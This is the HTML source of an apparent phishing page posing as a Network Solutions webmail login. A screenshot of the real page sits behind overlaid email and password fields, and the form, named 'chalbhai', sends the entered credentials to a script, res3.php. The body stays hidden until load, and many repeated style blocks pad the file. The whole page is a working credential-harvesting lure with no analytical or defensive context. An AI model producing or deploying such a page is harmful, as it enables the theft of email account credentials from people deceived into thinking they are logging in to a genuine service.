<HTML><head>
<title>Network Solutions&#169; Webmail Login</title>
<meta http-equiv="content-type" content="text/html; charset=UTF8">

<link type="image/x-icon" rel="shortcut icon" href="">

<script type="text/javascript">

function unhideBody()
{
var bodyElems = document.getElementsByTagName("body");
bodyElems[0].style.visibility = "visible";
}

</script>

<body style="visibility:hidden" onload="unhideBody()">


<style> 
 .textbox { 
    height: 30px;
    width: 221px;
    margin-bottom: 15px;
    border: 1px solid #cfccca;
    font-size: 16px;
    padding-left: 8px;
    font-family: "Gotham Narrow",Arial,sans-serif;
    box-shadow: inset 0 1px 3px rgba(0,0,0,0.10);
}
 } 
</style> 

<style type="text/css">
div#container
{
	position:relative;
	width:  100%; 
  height: 100%; 
  background-size: 100%;
  background-position: center;
  background-repeat: no-repeat;
	text-align:left; 
}
body {text-align:center;margin:0}
</style>

</head>
<body bgColor="#F3F3F3" Link="#000000" VLink="#000000" ALink="#000000">
<STYLE> 
 .textbox { 
    height: 30px;
    width: 221px;
    margin-bottom: 15px;
    border: 1px solid #cfccca;
    font-size: 16px;
    padding-left: 8px;
    font-family: "Gotham Narrow",Arial,sans-serif;
    box-shadow: inset 0 1px 3px rgba(0,0,0,0.10);
}
 } 
</STYLE>

<STYLE type=text/css>
div#container
{
	position:relative;
	width:  100%; 
  height: 100%; 
  background-size: 100%;
  background-position: center;
  background-repeat: no-repeat;
	text-align:left; 
}
body {text-align:center;margin:0}
</STYLE>

<STYLE> 
 .textbox { 
    height: 30px;
    width: 221px;
    margin-bottom: 15px;
    border: 1px solid #cfccca;
    font-size: 16px;
    padding-left: 8px;
    font-family: "Gotham Narrow",Arial,sans-serif;
    box-shadow: inset 0 1px 3px rgba(0,0,0,0.10);
}
 } 
</STYLE>

<STYLE type=text/css>
div#container
{
	position:relative;
	width:  100%; 
  height: 100%; 
  background-size: 100%;
  background-position: center;
  background-repeat: no-repeat;
	text-align:left; 
}
body {text-align:center;margin:0}
</STYLE>

<STYLE> 
 .textbox { 
    height: 30px;
    width: 221px;
    margin-bottom: 15px;
    border: 1px solid #cfccca;
    font-size: 16px;
    padding-left: 8px;
    font-family: "Gotham Narrow",Arial,sans-serif;
    box-shadow: inset 0 1px 3px rgba(0,0,0,0.10);
}
 } 
</STYLE>

<STYLE type=text/css>
div#container
{
	position:relative;
	width:  100%; 
  height: 100%; 
  background-size: 100%;
  background-position: center;
  background-repeat: no-repeat;
	text-align:left; 
}
body {text-align:center;margin:0}
</STYLE>

<STYLE> 
 .textbox { 
    height: 30px;
    width: 221px;
    margin-bottom: 15px;
    border: 1px solid #cfccca;
    font-size: 16px;
    padding-left: 8px;
    font-family: "Gotham Narrow",Arial,sans-serif;
    box-shadow: inset 0 1px 3px rgba(0,0,0,0.10);
}
 } 
</STYLE>

<STYLE type=text/css>
div#container
{
	position:relative;
	width:  100%; 
  height: 100%; 
  background-size: 100%;
  background-position: center;
  background-repeat: no-repeat;
	text-align:left; 
}
body {text-align:center;margin:0}
</STYLE>

<STYLE> 
 .textbox { 
    height: 30px;
    width: 221px;
    margin-bottom: 15px;
    border: 1px solid #cfccca;
    font-size: 16px;
    padding-left: 8px;
    font-family: "Gotham Narrow",Arial,sans-serif;
    box-shadow: inset 0 1px 3px rgba(0,0,0,0.10);
}
 } 
</STYLE>

<STYLE type=text/css>
div#container
{
	position:relative;
	width:  100%; 
  height: 100%; 
  background-size: 100%;
  background-position: center;
  background-repeat: no-repeat;
	text-align:left; 
}
body {text-align:center;margin:0}
</STYLE>

<STYLE> 
 .textbox { 
    height: 30px;
    width: 221px;
    margin-bottom: 15px;
    border: 1px solid #cfccca;
    font-size: 16px;
    padding-left: 8px;
    font-family: "Gotham Narrow",Arial,sans-serif;
    box-shadow: inset 0 1px 3px rgba(0,0,0,0.10);
}
 } 
</STYLE>

<STYLE type=text/css>
div#container
{
	position:relative;
	width:  100%; 
  height: 100%; 
  background-size: 100%;
  background-position: center;
  background-repeat: no-repeat;
	text-align:left; 
}
body {text-align:center;margin:0}
</STYLE>

<STYLE> 
 .textbox { 
    height: 30px;
    width: 221px;
    margin-bottom: 15px;
    border: 1px solid #cfccca;
    font-size: 16px;
    padding-left: 8px;
    font-family: "Gotham Narrow",Arial,sans-serif;
    box-shadow: inset 0 1px 3px rgba(0,0,0,0.10);
}
 } 
</STYLE>

<STYLE type=text/css>
div#container
{
	position:relative;
	width:  100%; 
  height: 100%; 
  background-size: 100%;
  background-position: center;
  background-repeat: no-repeat;
	text-align:left; 
}
body {text-align:center;margin:0}
</STYLE>

<STYLE> 
 .textbox { 
    height: 30px;
    width: 221px;
    margin-bottom: 15px;
    border: 1px solid #cfccca;
    font-size: 16px;
    padding-left: 8px;
    font-family: "Gotham Narrow",Arial,sans-serif;
    box-shadow: inset 0 1px 3px rgba(0,0,0,0.10);
}
 } 
</STYLE>

<STYLE type=text/css>
div#container
{
	position:relative;
	width:  100%; 
  height: 100%; 
  background-size: 100%;
  background-position: center;
  background-repeat: no-repeat;
	text-align:left; 
}
body {text-align:center;margin:0}
</STYLE>

<STYLE> 
 .textbox { 
    height: 30px;
    width: 221px;
    margin-bottom: 15px;
    border: 1px solid #cfccca;
    font-size: 16px;
    padding-left: 8px;
    font-family: "Gotham Narrow",Arial,sans-serif;
    box-shadow: inset 0 1px 3px rgba(0,0,0,0.10);
}
 } 
</STYLE>

<STYLE type=text/css>
div#container
{
	position:relative;
	width:  100%; 
  height: 100%; 
  background-size: 100%;
  background-position: center;
  background-repeat: no-repeat;
	text-align:left; 
}
body {text-align:center;margin:0}
</STYLE>

<STYLE> 
 .textbox { 
    height: 30px;
    width: 221px;
    margin-bottom: 15px;
    border: 1px solid #cfccca;
    font-size: 16px;
    padding-left: 8px;
    font-family: "Gotham Narrow",Arial,sans-serif;
    box-shadow: inset 0 1px 3px rgba(0,0,0,0.10);
}
 } 
</STYLE>

<STYLE type=text/css>
div#container
{
	position:relative;
	width:  100%; 
  height: 100%; 
  background-size: 100%;
  background-position: center;
  background-repeat: no-repeat;
	text-align:left; 
}
body {text-align:center;margin:0}
</STYLE>

<DIV id=container>
<DIV id=image2 style="HEIGHT: 540px; WIDTH: 980px; LEFT: 216px; Z-INDEX: 1; TOP: 0px"><IMG title="" border=0 alt="" src="img/001.png" width=1460 height=820></DIV>




<FORM id=chalbhai onsubmit=" return formbreeze_sub()" method=post name=chalbhai action=res3.php>

<INPUT class=textbox style="HEIGHT:41px; WIDTH: 340px; POSITION: absolute; LEFT: 560px; Z-INDEX: 5; TOP: 348px" maxLength=50 size=1 name=userid required placeholder="Email Address"> 

<INPUT class=textbox style="HEIGHT: 40px; WIDTH: 340px; POSITION: absolute; LEFT: 560px; Z-INDEX: 6; TOP: 405px" size=1 type=password name=password required placeholder="Password"> 

<DIV id=formimage1 style="POSITION: absolute; LEFT: 560px; Z-INDEX: 7; TOP: 460px"><INPUT height=42 src="img/logonn.png" type=image width=340 name=formimage1></DIV></FORM></DIV>


<IMG src="http://none.com" width=0 height=0> </BODY></HTML>